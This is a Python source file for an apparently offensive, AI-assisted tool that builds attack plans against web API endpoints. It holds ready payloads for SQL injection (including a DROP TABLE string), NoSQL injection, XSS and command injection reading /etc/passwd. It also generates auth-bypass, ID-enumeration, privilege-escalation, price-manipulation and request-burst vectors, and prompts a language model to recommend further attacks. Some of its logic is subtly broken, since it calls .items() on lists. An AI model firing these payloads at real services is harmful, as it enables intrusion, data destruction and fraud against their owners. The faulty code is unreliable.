#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Enhanced Hunter Agent - AI-Powered Attack Plan Generator
Advanced endpoint analysis and targeted vulnerability hunting with AI guidance
"""

import asyncio
import json
import logging
import random
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode

# AI integration
try:
    from ai.advanced_ai_coordinator import AdvancedAICoordinator, AIRequest
    AI_AVAILABLE = True
except ImportError:
    AI_AVAILABLE = False

log = logging.getLogger(__name__)

@dataclass
class AttackVector:
    """Enhanced attack vector with AI insights"""
    name: str
    method: str
    url: str
    headers: Dict[str, str]
    data: Dict[str, Any]
    payload_type: str
    priority: int = 1
    confidence: float = 0.5
    ai_guidance: Dict[str, Any] = None
    expected_indicators: List[str] = None

@dataclass
class AttackPlan:
    """Comprehensive attack plan with AI-powered vectors"""
    target_endpoint: str
    attack_vectors: List[AttackVector]
    business_context: str
    risk_assessment: Dict[str, Any]
    ai_insights: Dict[str, Any]
    estimated_duration: int = 300  # seconds
    created_at: datetime = None

class EnhancedHunterAgent:
    """
    Advanced AI-powered attack plan generator and executor
    Features:
    - AI-guided vulnerability prediction and targeting
    - Context-aware attack vector generation
    - Business logic vulnerability detection
    - Adaptive payload generation based on endpoint analysis
    - Risk-based attack prioritization
    - Real-time attack effectiveness learning
    """
    
    def __init__(self, ai_enhanced: bool = True, max_attacks_per_endpoint: int = 10):
        self.ai_enhanced = ai_enhanced and AI_AVAILABLE
        self.max_attacks_per_endpoint = max_attacks_per_endpoint
        
        # Attack pattern libraries
        self.injection_payloads = {
            "sql": [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,version(),NULL--",
                "'; DROP TABLE users; --",
                "admin'/*",
                "' OR 1=1#",
                "1' AND SLEEP(5)--"
            ],
            "nosql": [
                {"$ne": None},
                {"$gt": ""},
                {"$regex": ".*"},
                {"$where": "1==1"},
                {"$in": ["admin", "root"]}
            ],
            "xss": [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>"
            ],
            "command": [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(whoami)"
            ]
        }
        
        self.business_logic_tests = {
            "privilege_escalation": [
                {"role": "admin"},
                {"is_admin": True},
                {"user_type": "administrator"},
                {"permissions": ["all"]},
                {"access_level": 999}
            ],
            "price_manipulation": [
                {"price": 0},
                {"amount": -100},
                {"discount": 100},
                {"total": 0.01}
            ],
            "quantity_abuse": [
                {"quantity": -1},
                {"qty": 99999},
                {"amount": 0},
                {"count": -999}
            ]
        }
        
        # AI coordinator
        self.ai_coordinator = None
        if self.ai_enhanced:
            try:
                self.ai_coordinator = AdvancedAICoordinator()
                log.info("✅ AI-enhanced hunter agent initialized")
            except Exception as e:
                log.warning(f"AI coordinator initialization failed: {e}")
                self.ai_enhanced = False

    async def build_enhanced_attack_plan(self, endpoint: Dict[str, Any]) -> AttackPlan:
        """Build comprehensive attack plan with AI guidance"""
        try:
            log.info(f"🎯 Building enhanced attack plan for {endpoint.get('method')} {endpoint.get('url')}")
            
            # Basic endpoint analysis
            basic_vectors = await self._generate_basic_attack_vectors(endpoint)
            
            # AI-enhanced analysis
            ai_insights = {}
            ai_vectors = []
            
            if self.ai_enhanced:
                try:
                    ai_insights = await self._analyze_endpoint_with_ai(endpoint)
                    ai_vectors = await self._generate_ai_guided_vectors(endpoint, ai_insights)
                except Exception as e:
                    log.error(f"AI analysis failed: {e}")
            
            # Combine and prioritize vectors
            all_vectors = basic_vectors + ai_vectors
            prioritized_vectors = self._prioritize_attack_vectors(all_vectors, ai_insights)
            
            # Limit vectors to max allowed
            final_vectors = prioritized_vectors[:self.max_attacks_per_endpoint]
            
            # Business context analysis
            business_context = await self._analyze_business_context(endpoint)
            
            # Risk assessment
            risk_assessment = self._calculate_risk_assessment(endpoint, final_vectors)
            
            plan = AttackPlan(
                target_endpoint=endpoint.get('url', ''),
                attack_vectors=final_vectors,
                business_context=business_context,
                risk_assessment=risk_assessment,
                ai_insights=ai_insights,
                estimated_duration=len(final_vectors) * 30,  # 30 seconds per vector
                created_at=datetime.now()
            )
            
            log.info(f"📋 Generated attack plan with {len(final_vectors)} vectors")
            return plan
            
        except Exception as e:
            log.error(f"Failed to build attack plan: {e}")
            return AttackPlan(
                target_endpoint=endpoint.get('url', ''),
                attack_vectors=[],
                business_context="Analysis failed",
                risk_assessment={"error": str(e)},
                ai_insights={},
                created_at=datetime.now()
            )

    async def _generate_basic_attack_vectors(self, endpoint: Dict[str, Any]) -> List[AttackVector]:
        """Generate basic attack vectors using pattern matching"""
        vectors = []
        
        method = endpoint.get('method', 'GET').upper()
        url = endpoint.get('url', '')
        headers = endpoint.get('headers', {})
        base_data = self._extract_base_data(endpoint)
        
        # Authentication bypass vectors
        if headers.get('Authorization') or any('auth' in h.lower() for h in headers.keys()):
            vectors.extend(self._generate_auth_bypass_vectors(method, url, base_data))
        
        # Injection vectors for data-accepting methods
        if method in ['POST', 'PUT', 'PATCH'] or '?' in url:
            vectors.extend(self._generate_injection_vectors(method, url, base_data))
        
        # Business logic vectors
        vectors.extend(self._generate_business_logic_vectors(method, url, base_data, endpoint))
        
        # IDOR vectors
        vectors.extend(self._generate_idor_vectors(method, url, base_data))
        
        # Rate limiting vectors
        vectors.extend(self._generate_rate_limiting_vectors(method, url, base_data))
        
        return vectors

    def _generate_auth_bypass_vectors(self, method: str, url: str, base_data: Dict) -> List[AttackVector]:
        """Generate authentication bypass vectors"""
        vectors = []
        
        # No authentication header
        vectors.append(AttackVector(
            name="Authentication Bypass - No Token",
            method=method,
            url=url,
            headers={},  # Remove all auth headers
            data=base_data.copy(),
            payload_type="auth_bypass",
            priority=1,
            confidence=0.7,
            expected_indicators=["200", "success", "authenticated"]
        ))
        
        # Invalid token
        vectors.append(AttackVector(
            name="Authentication Bypass - Invalid Token",
            method=method,
            url=url,
            headers={"Authorization": "Bearer invalid_token_12345"},
            data=base_data.copy(),
            payload_type="auth_bypass",
            priority=1,
            confidence=0.6,
            expected_indicators=["200", "success"]
        ))
        
        # Expired token simulation
        vectors.append(AttackVector(
            name="Authentication Bypass - Malformed Token",
            method=method,
            url=url,
            headers={"Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0"},
            data=base_data.copy(),
            payload_type="auth_bypass",
            priority=2,
            confidence=0.5
        ))
        
        return vectors

    def _generate_injection_vectors(self, method: str, url: str, base_data: Dict) -> List[AttackVector]:
        """Generate injection attack vectors"""
        vectors = []
        
        # SQL Injection vectors
        for i, payload in enumerate(self.injection_payloads["sql"][:3]):  # Limit to top 3
            test_data = base_data.copy()
            
            # Inject into first string parameter
            for key, value in test_data.items():
                if isinstance(value, str):
                    test_data[key] = payload
                    break
            
            vectors.append(AttackVector(
                name=f"SQL Injection Test #{i+1}",
                method=method,
                url=url,
                headers={"Content-Type": "application/json"},
                data=test_data,
                payload_type="sql_injection",
                priority=1,
                confidence=0.8,
                expected_indicators=["error", "mysql", "syntax", "column", "table"]
            ))
        
        # XSS vectors for appropriate endpoints
        if method in ['POST', 'PUT', 'PATCH']:
            for i, payload in enumerate(self.injection_payloads["xss"][:2]):
                test_data = base_data.copy()
                test_data.update({"comment": payload, "message": payload, "content": payload})
                
                vectors.append(AttackVector(
                    name=f"XSS Test #{i+1}",
                    method=method,
                    url=url,
                    headers={"Content-Type": "application/json"},
                    data=test_data,
                    payload_type="xss",
                    priority=2,
                    confidence=0.7,
                    expected_indicators=["<script", "alert", "javascript:"]
                ))
        
        # NoSQL Injection
        for i, payload in enumerate(self.injection_payloads["nosql"][:2]):
            test_data = base_data.copy()
            test_data["username"] = payload
            
            vectors.append(AttackVector(
                name=f"NoSQL Injection Test #{i+1}",
                method=method,
                url=url,
                headers={"Content-Type": "application/json"},
                data=test_data,
                payload_type="nosql_injection",
                priority=2,
                confidence=0.6,
                expected_indicators=["$ne", "$gt", "mongodb", "query"]
            ))
        
        return vectors

    def _generate_business_logic_vectors(self, method: str, url: str, base_data: Dict, endpoint: Dict) -> List[AttackVector]:
        """Generate business logic attack vectors"""
        vectors = []
        url_lower = url.lower()
        business_function = endpoint.get('business_function', '')
        
        # Privilege escalation tests
        if any(term in url_lower for term in ['user', 'account', 'profile', 'admin']):
            for test_name, payloads in self.business_logic_tests["privilege_escalation"].items():
                test_data = base_data.copy()
                test_data.update(payloads[0])  # Use first payload
                
                vectors.append(AttackVector(
                    name=f"Privilege Escalation - {test_name}",
                    method=method,
                    url=url,
                    headers={"Content-Type": "application/json"},
                    data=test_data,
                    payload_type="privilege_escalation",
                    priority=1,
                    confidence=0.8,
                    expected_indicators=["admin", "success", "elevated", "permission"]
                ))
        
        # Price manipulation for e-commerce
        if any(term in url_lower for term in ['payment', 'order', 'cart', 'purchase', 'price']):
            for test_name, payloads in self.business_logic_tests["price_manipulation"].items():
                test_data = base_data.copy()
                test_data.update(payloads[0])
                
                vectors.append(AttackVector(
                    name=f"Price Manipulation - {test_name}",
                    method=method,
                    url=url,
                    headers={"Content-Type": "application/json"},
                    data=test_data,
                    payload_type="price_manipulation",
                    priority=1,
                    confidence=0.9,
                    expected_indicators=["total", "amount", "success", "processed"]
                ))
        
        return vectors

    def _generate_idor_vectors(self, method: str, url: str, base_data: Dict) -> List[AttackVector]:
        """Generate IDOR (Insecure Direct Object Reference) vectors"""
        vectors = []
        
        # Find numeric IDs in URL
        import re
        id_matches = re.findall(r'/(\d+)(?:/|$)', url)
        
        for id_value in id_matches[:2]:  # Limit to first 2 IDs
            try:
                current_id = int(id_value)
                
                # Test adjacent IDs
                for new_id in [current_id + 1, current_id - 1, 1, 9999]:
                    if new_id == current_id:
                        continue
                        
                    modified_url = url.replace(f'/{id_value}', f'/{new_id}', 1)
                    
                    vectors.append(AttackVector(
                        name=f"IDOR Test - ID {id_value} → {new_id}",
                        method=method,
                        url=modified_url,
                        headers={},
                        data=base_data.copy(),
                        payload_type="idor",
                        priority=1,
                        confidence=0.8,
                        expected_indicators=["200", "success", "data", "user"]
                    ))
                    
            except ValueError:
                continue
        
        # Query parameter IDOR
        if '?' in url:
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            
            for param, values in query_params.items():
                if values and param.lower() in ['id', 'user_id', 'account_id']:
                    try:
                        current_value = int(values[0])
                        new_value = current_value + 1
                        
                        new_params = query_params.copy()
                        new_params[param] = [str(new_value)]
                        new_query = urlencode(new_params, doseq=True)
                        new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                        
                        vectors.append(AttackVector(
                            name=f"IDOR Query Parameter - {param}",
                            method=method,
                            url=new_url,
                            headers={},
                            data=base_data.copy(),
                            payload_type="idor",
                            priority=2,
                            confidence=0.7
                        ))
                        
                    except (ValueError, IndexError):
                        continue
        
        return vectors

    def _generate_rate_limiting_vectors(self, method: str, url: str, base_data: Dict) -> List[AttackVector]:
        """Generate rate limiting test vectors"""
        vectors = []
        
        # Basic rate limiting test
        vectors.append(AttackVector(
            name="Rate Limiting Test - Burst",
            method=method,
            url=url,
            headers={},
            data=base_data.copy(),
            payload_type="rate_limiting",
            priority=3,
            confidence=0.5,
            ai_guidance={"repeat_count": 100, "delay": 0.1},
            expected_indicators=["429", "rate limit", "too many requests"]
        ))
        
        return vectors

    async def _analyze_endpoint_with_ai(self, endpoint: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze endpoint with AI for advanced insights"""
        if not self.ai_coordinator:
            return {}
        
        try:
            # Prepare endpoint summary for AI
            endpoint_summary = {
                "method": endpoint.get("method"),
                "url": endpoint.get("url"),
                "business_function": endpoint.get("business_function"),
                "security_implications": endpoint.get("security_implications", []),
                "auth_required": endpoint.get("auth", {}).get("type") != "none",
                "has_parameters": bool(endpoint.get("url_params")) or bool(endpoint.get("body")),
                "folder_path": endpoint.get("folder_path", [])
            }
            
            prompt = f"""Analyze this API endpoint for security vulnerabilities and attack vectors:

Endpoint Analysis:
{json.dumps(endpoint_summary, indent=2)}

Provide comprehensive security analysis as JSON:
{{
  "vulnerability_prediction": {{
    "high_risk_vulnerabilities": ["vulnerability_types"],
    "attack_surface_analysis": "description",
    "business_logic_risks": ["risks"],
    "authentication_weaknesses": ["weaknesses"]
  }},
  "recommended_attacks": {{
    "priority_1_attacks": [
      {{
        "attack_type": "type",
        "target_parameter": "parameter",
        "payload_strategy": "strategy",
        "success_indicators": ["indicators"]
      }}
    ],
    "specialized_tests": [
      {{
        "test_name": "name", 
        "technique": "technique",
        "expected_outcome": "outcome"
      }}
    ]
  }},
  "context_analysis": {{
    "business_impact_potential": "high|medium|low",
    "data_sensitivity": "high|medium|low",
    "exploit_complexity": "easy|medium|hard",
    "remediation_difficulty": "easy|medium|hard"
  }}
}}
"""
            
            request = AIRequest(
                task_type="endpoint_security_analysis",
                prompt=prompt,
                temperature=0.2,
                require_json=True
            )
            
            response = await self.ai_coordinator.process_request(request)
            
            if response.success:
                return self._parse_ai_analysis(response.content)
            
        except Exception as e:
            log.error(f"AI endpoint analysis failed: {e}")
        
        return {}

    def _parse_ai_analysis(self, content: str) -> Dict[str, Any]:
        """Parse AI analysis response"""
        try:
            start = content.find('{')
            end = content.rfind('}') + 1
            
            if start >= 0 and end > start:
                json_str = content[start:end]
                return json.loads(json_str)
        except Exception as e:
            log.error(f"Failed to parse AI analysis: {e}")
        
        return {}

    async def _generate_ai_guided_vectors(self, endpoint: Dict[str, Any], ai_insights: Dict[str, Any]) -> List[AttackVector]:
        """Generate attack vectors based on AI insights"""
        vectors = []
        
        if not ai_insights:
            return vectors
        
        try:
            recommended_attacks = ai_insights.get("recommended_attacks", {})
            priority_attacks = recommended_attacks.get("priority_1_attacks", [])
            
            method = endpoint.get('method', 'GET')
            url = endpoint.get('url', '')
            base_data = self._extract_base_data(endpoint)
            
            for i, attack_info in enumerate(priority_attacks[:3]):  # Limit to top 3
                attack_type = attack_info.get("attack_type", "custom")
                target_param = attack_info.get("target_parameter", "input")
                strategy = attack_info.get("payload_strategy", "standard")
                indicators = attack_info.get("success_indicators", [])
                
                # Create custom payload based on strategy
                custom_payload = self._generate_custom_payload(attack_type, strategy)
                
                test_data = base_data.copy()
                if target_param and custom_payload:
                    test_data[target_param] = custom_payload
                
                vectors.append(AttackVector(
                    name=f"AI-Guided {attack_type.title()} #{i+1}",
                    method=method,
                    url=url,
                    headers={"Content-Type": "application/json"},
                    data=test_data,
                    payload_type=f"ai_guided_{attack_type}",
                    priority=1,
                    confidence=0.9,
                    ai_guidance=attack_info,
                    expected_indicators=indicators
                ))
            
            # Add specialized tests
            specialized_tests = recommended_attacks.get("specialized_tests", [])
            for test_info in specialized_tests[:2]:  # Limit to top 2
                test_name = test_info.get("test_name", "Specialized Test")
                technique = test_info.get("technique", "custom")
                
                vectors.append(AttackVector(
                    name=f"AI Specialized - {test_name}",
                    method=method,
                    url=url,
                    headers={"Content-Type": "application/json"},
                    data=base_data.copy(),
                    payload_type="ai_specialized",
                    priority=2,
                    confidence=0.8,
                    ai_guidance=test_info
                ))
            
        except Exception as e:
            log.error(f"Failed to generate AI-guided vectors: {e}")
        
        return vectors

    def _generate_custom_payload(self, attack_type: str, strategy: str) -> Any:
        """Generate custom payload based on attack type and strategy"""
        if attack_type == "sql_injection":
            if strategy == "time_based":
                return "1' AND SLEEP(5)--"
            elif strategy == "union_based":
                return "1' UNION SELECT NULL,version()--"
            else:
                return random.choice(self.injection_payloads["sql"])
        
        elif attack_type == "xss":
            return random.choice(self.injection_payloads["xss"])
        
        elif attack_type == "command_injection":
            return random.choice(self.injection_payloads["command"])
        
        elif attack_type == "privilege_escalation":
            return {"role": "admin", "is_admin": True}
        
        else:
            return "custom_test_payload"

    def _prioritize_attack_vectors(self, vectors: List[AttackVector], ai_insights: Dict[str, Any]) -> List[AttackVector]:
        """Prioritize attack vectors based on confidence and AI insights"""
        def priority_score(vector):
            base_score = (4 - vector.priority) * 100  # Priority 1 = 300, 2 = 200, 3 = 100
            confidence_score = vector.confidence * 100
            ai_bonus = 50 if vector.ai_guidance else 0
            return base_score + confidence_score + ai_bonus
        
        return sorted(vectors, key=priority_score, reverse=True)

    async def _analyze_business_context(self, endpoint: Dict[str, Any]) -> str:
        """Analyze business context of endpoint"""
        url = endpoint.get('url', '').lower()
        method = endpoint.get('method', 'GET')
        business_function = endpoint.get('business_function', '')
        
        context_indicators = []
        
        if any(term in url for term in ['payment', 'billing', 'order']):
            context_indicators.append("Financial operations")
        if any(term in url for term in ['admin', 'manage', 'config']):
            context_indicators.append("Administrative functions")
        if any(term in url for term in ['user', 'profile', 'account']):
            context_indicators.append("User data management")
        if method in ['POST', 'PUT', 'DELETE']:
            context_indicators.append("State-changing operations")
        
        if business_function:
            context_indicators.append(f"Business function: {business_function}")
        
        return "; ".join(context_indicators) if context_indicators else "General API functionality"

    def _calculate_risk_assessment(self, endpoint: Dict[str, Any], vectors: List[AttackVector]) -> Dict[str, Any]:
        """Calculate comprehensive risk assessment"""
        high_priority_count = len([v for v in vectors if v.priority == 1])
        auth_bypass_count = len([v for v in vectors if v.payload_type == "auth_bypass"])
        injection_count = len([v for v in vectors if "injection" in v.payload_type])
        
        risk_score = (high_priority_count * 3) + (auth_bypass_count * 2) + injection_count
        
        if risk_score >= 10:
            risk_level = "Critical"
        elif risk_score >= 6:
            risk_level = "High"
        elif risk_score >= 3:
            risk_level = "Medium"
        else:
            risk_level = "Low"
        
        return {
            "risk_level": risk_level,
            "risk_score": risk_score,
            "attack_vector_count": len(vectors),
            "high_priority_attacks": high_priority_count,
            "authentication_tests": auth_bypass_count,
            "injection_tests": injection_count,
            "business_logic_tests": len([v for v in vectors if "logic" in v.payload_type or "escalation" in v.payload_type])
        }

    def _extract_base_data(self, endpoint: Dict[str, Any]) -> Dict[str, Any]:
        """Extract base data from endpoint for use in attack vectors"""
        base_data = {}
        
        # Add URL parameters
        url_params = endpoint.get('url_params', {})
        if url_params:
            base_data.update(url_params)
        
        # Add body data
        body = endpoint.get('body', {})
        if body.get('mode') == 'raw' and body.get('content'):
            try:
                body_json = json.loads(body['content'])
                if isinstance(body_json, dict):
                    base_data.update(body_json)
            except json.JSONDecodeError:
                pass
        
        elif body.get('mode') == 'formdata':
            for field in body.get('form_data', []):
                if isinstance(field, dict):
                    key = field.get('key', '')
                    value = field.get('value', '')
                    if key:
                        base_data[key] = value
        
        # Add common test parameters if none exist
        if not base_data:
            base_data = {
                "username": "testuser",
                "email": "test@example.com",
                "id": "123",
                "input": "test_value"
            }
        
        return base_data

    def get_attack_statistics(self, plan: AttackPlan) -> Dict[str, Any]:
        """Get comprehensive attack plan statistics"""
        vectors = plan.attack_vectors
        
        payload_types = {}
        priorities = {1: 0, 2: 0, 3: 0}
        
        for vector in vectors:
            # Count payload types
            payload_types[vector.payload_type] = payload_types.get(vector.payload_type, 0) + 1
            
            # Count priorities
            if vector.priority in priorities:
                priorities[vector.priority] += 1
        
        return {
            "total_vectors": len(vectors),
            "payload_type_distribution": payload_types,
            "priority_distribution": priorities,
            "ai_enhanced_vectors": len([v for v in vectors if v.ai_guidance]),
            "estimated_duration_minutes": plan.estimated_duration // 60,
            "risk_level": plan.risk_assessment.get("risk_level", "Unknown"),
            "business_context": plan.business_context,
            "ai_insights_available": bool(plan.ai_insights)
        }

# Legacy compatibility class
class HunterAgent:
    """Legacy compatibility wrapper for EnhancedHunterAgent"""
    
    def __init__(self, max_attempts_per_endpoint: int = 6):
        self.enhanced_agent = EnhancedHunterAgent(max_attacks_per_endpoint=max_attempts_per_endpoint)

    def build_plan(self, endpoint: Dict[str, Any]) -> AttackPlan:
        """Legacy synchronous method"""
        return asyncio.run(self.enhanced_agent.build_enhanced_attack_plan(endpoint))

# Usage example
if __name__ == "__main__":
    async def main():
        hunter = EnhancedHunterAgent(ai_enhanced=True)
        
        # Example endpoint
        sample_endpoint = {
            "name": "User Login",
            "method": "POST",
            "url": "https://api.example.com/auth/login",
            "headers": {"Content-Type": "application/json"},
            "body": {
                "mode": "raw",
                "content": '{"username": "user", "password": "pass"}'
            },
            "business_function": "Authentication & Authorization",
            "security_implications": ["Authentication required"],
            "auth": {"type": "none"}
        }
        
        # Build attack plan
        plan = await hunter.build_enhanced_attack_plan(sample_endpoint)
        
        # Display results
        print(f"🎯 Attack Plan for {plan.target_endpoint}")
        print(f"📊 Risk Level: {plan.risk_assessment.get('risk_level')}")
        print(f"🔍 Attack Vectors: {len(plan.attack_vectors)}")
        print(f"⏱️ Estimated Duration: {plan.estimated_duration} seconds")
        print(f"🧠 AI Enhanced: {bool(plan.ai_insights)}")
        
        # Show first few vectors
        for i, vector in enumerate(plan.attack_vectors[:3]):
            print(f"\n{i+1}. {vector.name}")
            print(f"   Type: {vector.payload_type}")
            print(f"   Priority: {vector.priority}")
            print(f"   Confidence: {vector.confidence:.2f}")
            
        # Get statistics
        stats = hunter.get_attack_statistics(plan)
        print(f"\n📈 Statistics: {json.dumps(stats, indent=2)}")

    asyncio.run(main())

